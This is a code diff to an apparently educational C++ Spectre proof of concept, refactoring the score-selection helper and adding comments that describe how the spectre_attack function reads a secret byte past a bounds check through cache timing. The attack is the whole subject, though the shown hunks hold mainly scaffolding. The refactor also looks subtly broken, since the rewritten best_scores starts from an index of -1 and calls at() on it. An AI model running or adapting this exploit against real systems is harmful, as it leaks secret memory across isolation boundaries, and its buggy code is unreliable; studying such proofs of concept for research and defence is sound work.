@@ -85,29 +85,38 @@ auto score_latencies(const Container auto& latencies, Container auto& scores, si
     }
 }
 
-template<typename S>
-std::pair<size_t, size_t> best_scores(const S& scores) {
-    size_t i1 = -1, i2 = -1;
-    for (size_t i = 0; i < scores.size(); ++i ) {
-        if (scores[i] > scores[i1]) {
+auto best_scores(const Container auto& scores) -> std::pair<size_t, size_t>
+{
+    auto i1 = -1, i2 = -1;
+    for (auto idx = 0; idx != scores.size(); ++idx ) {
+        if (scores.at(idx) > scores.at(i1)) {
             i2 = i1;
-            i1 = i;
-        } else if (i != i1 && scores[i] > scores[i2]) {
-            i2 = i;
+            i1 = idx;
+        } else if ( idx != i1 && scores[ idx ] > scores[i2]) {
+            i2 = idx;
         }
     }
     return { i1, i2 };
 }
 
+/// @brief Spectre attack function
+/// @param data is pointer to begin of combined of "accessible" and "secret" data.
+/// @param size is length of valid string from "accessible" memory block.
+/// @param evil_index is byte index where "data" is treated as begin of byte array.
+/// @return Byte from (data + evil_index).
 char spectre_attack(const char* data, std::size_t size, std::size_t evil_index)
 {
-    constexpr const std::size_t num_val = 256;
-    struct TimingElement { char s[1024]; };
-    static TimingElement timing_array[num_val];
+    constexpr const std::size_t num_val = 256;                      // Number of Timing Elements (size might be due to fact that we're reading by one byte)
+    constexpr const std::size_t timing_element_size = 1024;
+    struct TimingElement { char s[timing_element_size]; };          // 1KB
+    static TimingElement timing_array[num_val];                     // 256KB = 256 * Timing Element
     ::memset(timing_array, 1, sizeof(timing_array));
 
+    // Store Latencies of each Timing Element
     std::array<long, num_val> latencies = {};
+    // Store Scores of each Timing Element
     std::array<int, num_val> scores = {};
+
     std::size_t i1 = 0, i2 = 0;             // Two highest scores
     std::unique_ptr<size_t> data_size(new std::size_t(size));
 
@@ -141,7 +150,10 @@ char spectre_attack(const char* data, std::size_t size, std::size_t evil_index)
         score_latencies(latencies, scores, ok_index);
         std::tie(i1, i2) = best_scores(scores);
         constexpr const int threshold1 = 2, threshold2 = 100;
-        if (scores[i1] > scores[i2]*threshold1 + threshold2) return i1;
+        if (scores[i1] > scores[i2]*threshold1 + threshold2)
+        {
+            return i1;
+        }
     }
     return i2;
 }
